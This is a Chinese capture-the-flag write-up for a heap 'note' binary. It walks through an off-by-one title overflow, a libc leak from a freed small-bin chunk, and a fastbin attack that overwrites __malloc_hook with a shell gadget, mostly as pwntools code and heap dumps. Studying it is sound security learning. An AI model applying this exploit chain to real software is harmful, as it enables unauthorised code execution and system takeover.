## Preface
比赛的时候没做，现在稍微看了下，还是挺简单的 orz

## checksec

```Assembly
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### struct

```C
struct title_list
{
    int isused;         // +0x00
    int size;           // +0x04
    char title[0x10];   // +0x08
    (char*) buf;          // +0x18
};// 0x20
```

## Vuln

1. @read_buf读取title存在越界<br>
```C
for ( i = 0; i <= (signed int)a2; ++i )
 {
   if ( read(0, &buf, 1uLL) < 0 )
     exit(1);
   (a1 + i) = buf;
   if ( (char*)(i + a1) == '\n' )
   {
     (char*)(i + a1) = 0;
     return (unsigned int)i;
   }
 }
```

2. read 存在地址泄露

```Assembly
mov     eax, [rbp+$tmp_size]
movsxd  rdx, eax ; nbytes
mov     rax, [rbp+buf]
mov     rsi, rax ; buf
mov     edi, 0 ; fd
call    _read
```

## leak

```Python
for i in range(4):
    add_note(0xf8, chr(0x48+i)*0x9+'\n', chr(0x61+i)*0xf0)
```

```Assembly
000000F800000001 4848484848484848  ........HHHHHHHH
0000000000000048 00000000011E3010  H........0......
000000F800000001 4949494949494949  ........IIIIIIII
0000000000000049 00000000011E3110  I........1......
000000F800000001 4A4A4A4A4A4A4A4A  ........JJJJJJJJ
000000000000004A 00000000011E3210  J........2......
000000F800000001 4B4B4B4B4B4B4B4B  ........KKKKKKKK
000000000000004B 00000000011E3310  K........3......
```
接下来释放两个堆<br>
```Python
delete_note(2)
delete_note(3)
```
因为之前申请了small bin缘故，这里会再堆上存main arena 附件的地址<br>
```Assembly
011E3200  0000000000000000 0000000000000101  ................
011E3210  00007FCB1057FB78 00007FCB1057FB78  x.W.....x.W.....
```
接下来再申请堆，同时控制content为8字节<br>
```Python
add_note(0xf8, 'x'*0x10+chr(0x11), 'l'*0x08)
```
观察堆<br>
```Assembly
011E3200  0000000000000000 0000000000000101  ................
011E3210  6C6C6C6C6C6C6C6C 00007FCB1057FB78  llllllllx.W.....
```

接下来show一下就能读到地址了，然后算出libc地址<br>
```Python
show_note(2)
io.recvuntil("note content: ")
io.recv(0x7)
libc_base_addr = u64(io.recv(8)) - smlbin_area_off
```

## exp
我采用fastbin attack
```Python
payload = 'f'*0x40
payload += p64(0) + p64(0x91)
add_note(0x60, 'x'*0x10+chr(0x60), payload)  # 4
add_note(0x60, '5'*0x9+'\n', 'e'*0x10)  # 5
add_note(0x60, '5'*0x9+'\n', 'e'*0x10)  # 6
add_note(0x60, '7'*0x9+'\n', 'e'*0x10)  # 7
add_note(0x60, '8'*0x9+'\n', 'e'*0x10)  # 8
```
这里利用了@read_buf 1字节溢出<br>
0x011E3410处即为note4<br>
但是由于 'x'*0x10+chr(0x60) 填充，其结构体中buf低字节被修改为0x60。<br>
```Assembly
011E3400  0000000000000000 0000000000000071  ........q.......
011E3410  6666666666666666 6666666666666666  ffffffffffffffff
011E3420  6666666666666666 6666666666666666  ffffffffffffffff
011E3430  6666666666666666 6666666666666666  ffffffffffffffff
011E3440  6666666666666666 6666666666666666  ffffffffffffffff
011E3450  0000000000000000 0000000000000091  ................
011E3460  0000000000000000 0000000000000000  ................
```
接下来只要按顺序free<br>
先构造一个fastbin链表<br>
```Python
delete_note(6)
delete_note(5)
```

```Assembly
011E3470  0000000000000000 0000000000000071  ........q.......
011E3480  00000000011E34E0 6565656565656565  .4......eeeeeeee
011E3490  0000000000000000 0000000000000000  ................
011E34A0  0000000000000000 0000000000000000  ................
011E34B0  0000000000000000 0000000000000000  ................
011E34C0  0000000000000000 0000000000000000  ................
011E34D0  0000000000000000 0000000000000000  ................
011E34E0  0000000000000090 0000000000000070  ........p.......
011E34F0  0000000000000000 6565656565656565  ........eeeeeeee
011E3500  0000000000000000 0000000000000000  ................
011E3510  0000000000000000 0000000000000000  ................
011E3520  0000000000000000 0000000000000000  ................
011E3530  0000000000000000 0000000000000000  ................
011E3540  0000000000000000 0000000000000000  ................
```

然后破坏这个链表，指向一个伪块<br>
```Python
delete_note(4)
payload = 'a'*0x10
payload += p64(0) + p64(0x71)
payload += p64(libc_base_addr+malloc_hook_off-0x03-0x20)
add_note(0x80, 'o'*0x9+'\n', payload)
```
伪堆块主要利用shift malloc_hook上面的字节构造<br>
```Assembly
00007FCB1057FAED  CB1057E260000000 000000000000007F  ...`.W..........
00007FCB1057FAFD  CB10241270000000 CB10240E5000007F  ...p.$.....P.$..
00007FCB1057FB0D  000000000000007F 0000000000000000  ................

libc_2.23.so:00007FCB1057FB10 __malloc_hook db    0
```
最后填充改地址为 exec binsh 地址即可

```Python
payload = chr(0)*3
payload += p64(0)*2
payload += p64(libc_base_addr+execv_binsh_off)
add_note(0x60, '8'*0x9+'\n', payload)
add_note(0x60, '8'*0x9+'\n', payload)
mmenu(1)
io.recvuntil("Please input the note size: ")
io.sendline(str(0x60))
io.interactive()
```
